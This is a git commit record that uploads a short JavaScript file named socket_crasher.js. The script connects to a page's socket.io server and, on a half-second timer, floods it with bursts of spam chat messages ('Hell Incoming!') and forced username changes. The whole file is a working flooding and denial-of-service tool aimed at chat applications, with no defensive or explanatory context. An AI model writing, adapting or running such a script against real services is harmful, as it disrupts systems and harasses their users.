bebc04c40992a5f04696261f7422a2b507e0a59b
random-development-hub <69511159+random-development-hub@users.noreply.github.com>
2021-03-08 16:50:55 +0200

    Add files via upload

---
+++ socket_crasher.js
@@ -0,0 +1,24 @@
+var socket = io.connect(window.location.hostname);
+var timeout_messages_count = 10;
+
+var i;
+var gtg = true;
+var gtgv = 0;
+var tmc = timeout_messages_count;
+
+setInterval(() => {
+    if (gtgv == 10) {
+        gtg = false;
+        setTimeout(function() { console.log("gtg set to true")}, 1500);
+        gtg = true;
+        gtgv = 0;
+    }
+    
+    else if (gtgv == 0) {
+        for (i = 0; i < 10; i++) {
+            gtgv += 1;
+            socket.emit('new_message', {message : "Hell Incoming!"})
+            socket.emit('change_username', {username : "Devil's Trident"})
+        }
+    }
+}, 500)
